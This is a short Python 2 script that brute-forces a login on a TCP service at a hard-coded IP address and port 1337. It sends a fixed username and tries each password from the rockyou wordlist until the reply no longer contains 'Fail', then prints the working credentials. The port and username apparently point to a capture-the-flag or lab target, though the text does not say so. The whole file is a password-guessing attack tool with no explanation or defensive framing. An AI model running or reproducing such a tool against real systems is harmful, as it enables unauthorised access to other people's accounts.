import socket
import multiprocessing
import sys

host = "142.93.136.81" # IP address here
port = 1337 # Port here
wordlist = "/usr/share/wordlists/rockyou.txt"
username = "v0idcache"

text_file = open(wordlist,"r")
passwords = text_file.read().split('\n')

def brute_force(host, port, username, password):
  try:
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((host, port))
    data=s.recv(1024)
    s.send(username+'\n')
    data=s.recv(1024)
    s.send(password+'\n')
    data=s.recv(1024)
    s.close()
  except SocketError as e:
    print "error"
  finally:
    return data

def caller(passwords):
  for password in passwords:
    p = brute_force(host, port, username, password)
    if "Fail" in p:
      print 'Failed Password:',password
      pass
    else:
      print 'We got it User:',username,'Password:',password
      socket.socket().close()
      sys.exit(1)

if __name__ == '__main__':
    caller(passwords)
